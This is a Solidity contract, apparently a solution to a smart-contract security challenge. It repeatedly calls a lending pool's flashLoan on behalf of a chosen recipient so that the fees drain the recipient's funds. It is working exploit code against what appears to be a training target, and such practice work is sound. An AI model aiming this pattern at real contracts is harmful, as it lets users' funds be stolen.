// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttacker {

    NaiveReceiverLenderPool private pool;

    constructor(address payable poolAddress) {
        pool = NaiveReceiverLenderPool(poolAddress);
    }

    function attack(address recipient, uint256 times) public {
        for(uint256 i = 0; i < times; i++) {
            pool.flashLoan(recipient, 0);
        }
    }
}
